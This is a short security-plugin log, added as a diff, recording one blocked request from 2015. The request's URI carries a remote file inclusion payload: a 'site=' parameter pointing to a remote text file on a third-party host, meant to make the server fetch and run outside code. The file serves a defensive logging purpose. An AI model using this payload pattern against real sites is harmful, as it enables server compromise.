@@ -1,0 +1,19 @@
+BPS SECURITY LOG
+=================
+=================
+
+[403 GET / HEAD Request: 18 febrero, 2015 - 09:29]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 201.2.95.69
+Host Name: 201-2-95-69.pmjce700.dsl.brasiltelecom.net.br
+SERVER_PROTOCOL: HTTP/1.0
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 201.2.95.69
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /campamento/index.php?site=http://www.fisheries.go.th/if-phrae/web2/images/4.txt?
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
